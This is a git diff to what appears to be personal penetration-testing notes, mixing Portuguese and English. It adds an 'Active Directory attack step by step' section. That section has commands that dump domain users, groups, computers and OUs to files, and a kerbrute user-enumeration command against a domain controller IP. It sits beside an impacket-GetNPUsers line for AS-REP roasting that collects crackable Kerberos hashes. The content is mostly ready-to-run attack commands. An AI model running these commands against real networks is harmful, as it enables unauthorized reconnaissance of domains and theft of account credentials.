@@ -9065,6 +9065,16 @@ Código console.py abaixo
 
 ## MTIA
 
+- ACTIVE DIRECTORY ATTACK STEP BY STEP
+
+Find users from Active Directory and save on a file
+  
+      net user /domain > ad_users_net.txt
+      adfind.exe -f "objectcategory=computer" > ad_computers.txt
+      net group "Domain Computers" /domain > ad_computers_net.txt
+      adfind.exe -f "objectcategory=organizationalUnit" > ad_ous.txt
+      net group /domain > ad_goup_net.txt
+
 Gerar arquivo Criptografado com tipo de imagem para o pentest
 
 	cryptsetup --verify-passphrase luksFormat File_Name.img
@@ -9080,6 +9090,7 @@ Gerar arquivo Criptografado com tipo de imagem para o pentest
 
     sudo nano /etc/hosts ADD IP-DC hostname.domain.local 
     sudo net time set -S IP-DC
+	kerbrute userenum -d floripa.local --dc 192.168.161.100 /usr/share/wordlists/users-pt-br.txt -o valid-users-dump
     impacket-GetNPUsers brasil.floripa.local/ -no-pass -usersfile /usr/share/wordlists/seclists/Usernames/cirt-default-usernames.txt -format hashcat -outputfile output-reproast - SALVA HASHES DO TIPO krbtg5 e -m 18200 
 
 `Kerberoasting` PRECISA TER UMA CREDENCIAL VALIDA PARA FAZER ESSE TIPO DE ATAQUE
